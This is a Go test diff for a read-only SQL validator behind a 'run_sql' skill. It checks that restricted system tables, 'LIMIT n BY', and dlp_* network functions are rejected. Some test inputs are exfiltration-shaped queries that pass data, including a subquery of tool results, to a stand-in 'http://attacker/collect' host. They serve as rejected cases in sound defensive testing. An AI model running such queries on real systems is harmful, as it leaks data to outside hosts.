@@ -295,6 +295,50 @@ func TestValidateReadOnlySQLSystemAllowlist(t *testing.T) {
 	}
 }
 
+// TestValidateReadOnlySQLReviewFixes covers the #237 hardening: table(system.*)
+// must clear the same allowlist as the bare form, dlp_* network UDFs are not
+// callable via run_sql (SSRF/exfil), and "LIMIT n BY" (per-group cap) is
+// rejected so it can't slip past the total-row clamp.
+func TestValidateReadOnlySQLReviewFixes(t *testing.T) {
+	cases := []struct {
+		name, sql string
+		wantErr   string
+		wantIn    string
+	}{
+		// table(system.*) allowlist parity
+		{"table(system.tables) allowed", "SELECT name FROM table(system.tables)", "", "LIMIT 100"},
+		{"table(system.users) rejected", "SELECT * FROM table(system.users)", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
+		{"table(system.processes) rejected", "SELECT * FROM table(system.processes)", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
+		// dlp_* network UDFs denied (no FROM needed — the SSRF shape)
+		{"dlp_embed denied", `SELECT dlp_embed('x','user','{"base_url":"http://attacker/collect"}')`, "not callable via run_sql", ""},
+		{"dlp_risk denied", `SELECT dlp_risk('x', [], '{"base_url":"http://attacker"}')`, "not callable via run_sql", ""},
+		{"dlp_embed in subquery denied", "SELECT dlp_embed((SELECT tool_result FROM table(agentguard_cim_event) LIMIT 1), 'user', '{}')", "not callable via run_sql", ""},
+		{"dlp_summarize with spacing denied", "SELECT dlp_summarize ('x','{}')", "not callable via run_sql", ""},
+		// a stream/column whose name merely contains "dlp_" is NOT a call and must pass
+		{"agentguard_cim table with dlp-like column ok", "SELECT event_id FROM table(agentguard_cim_event)", "", "LIMIT 100"},
+		// dlp_ inside a string literal is DATA, not a call
+		{"dlp_ in string literal ok", "SELECT event_id FROM table(agentguard_cim_event) WHERE tool_result = 'dlp_embed(x)'", "", "LIMIT 100"},
+		// LIMIT n BY rejected
+		{"LIMIT n BY rejected", "SELECT * FROM table(agentguard_cim_event) LIMIT 1 BY session_id", "LIMIT n BY", ""},
+		{"plain LIMIT still fine", "SELECT * FROM table(agentguard_cim_event) LIMIT 5", "", "LIMIT 5"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			out, err := ValidateReadOnlySQL(c.sql, 1000)
+			if c.wantErr == "" {
+				if err != nil {
+					t.Fatalf("unexpected reject: %v", err)
+				}
+				if !strings.Contains(out, c.wantIn) {
+					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
+				}
+			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
+				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
+			}
+		})
+	}
+}
+
 func TestRunSQLSkillMetadata(t *testing.T) {
 	s := NewRunSQL()
 	if s.Name() != "run_sql" {
